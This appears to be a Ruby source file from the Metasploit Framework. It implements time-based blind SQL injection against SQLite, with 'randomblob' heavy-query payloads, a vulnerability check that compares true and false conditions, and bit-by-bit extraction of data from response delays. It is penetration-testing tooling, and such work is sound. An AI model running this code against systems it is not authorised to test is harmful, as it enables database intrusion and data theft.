#
#   Time-Based Blind SQL injection support for SQLite
#
class Msf::Exploit::SQLi::SQLitei::TimeBasedBlind < Msf::Exploit::SQLi::SQLitei::Common
  HEAVYQUERY_DETECTION_SAMPLE = 10 # number of times to check if it yields a delay of @sleepdelay
  def initialize(opts, &query_proc)
    # TODO: automatically detect the sleep delay? here or in run_sql?
    @sleepdelay = opts[:sleepdelay] || 1
    super
    if opts[:heavyquery_parameter]
      @heavyquery_parameter = opts[:heavyquery_parameter]
    else
      detect_heavyquery_parameter
    end
    puts "[*] randomblob parameter: #{@heavyquery_parameter}"
  end

  def run_sql(query, output_charset = nil)
    # TODO: detect latency and update sleepdelay manually?
    if output_charset.is_a?(Range) && output_charset.count > 0
      known_bits, bits_to_guess = get_bitmask(output_charset)
    else
      known_bits = 0
      bits_to_guess = 8
    end
    puts "[*] Executing (#{query})" if @verbose
    if @hex_encode_strings
      query = hex_encode_strings(query)
      puts "[*] Encoded to (#{query})" if @verbose
    end
    # first, get the length of the output
    output_length = blind_detect_length(query, true)
    puts "[*] Time-based injection: expecting output of length #{output_length}" if @verbose
    # now, get the output, of the given length
    print '[+] Data: ' if @verbose
    blind_dump_data(query, output_length, known_bits, bits_to_guess, true)
  end

  #
  # This method checks if the target is vulnerable to Blind time-based injection by checking if
  # the target sleeps only when a given condition is true.
  #
  def test_vulnerable
    # run_sql and check if output is what's expected, or just check for delays?
    out_true = blind_request("1=1 and randomblob(#{@heavyquery_parameter})")
    out_false = blind_request("1=2 and randomblob(#{@heavyquery_parameter})")
    out_true && !out_false
  end

  private

  def blind_request(query)
    time = Time.now
    @query_proc.call(query)
    diff = Time.now - time
    diff >= @sleepdelay
  end

  def detect_heavyquery_parameter
    @heavyquery_parameter = 10000000
    loop do
      break if HEAVYQUERY_DETECTION_SAMPLE.times.all? { blind_request("randomblob(#{@heavyquery_parameter})") }

      @heavyquery_parameter *= 2
    end
  end
end
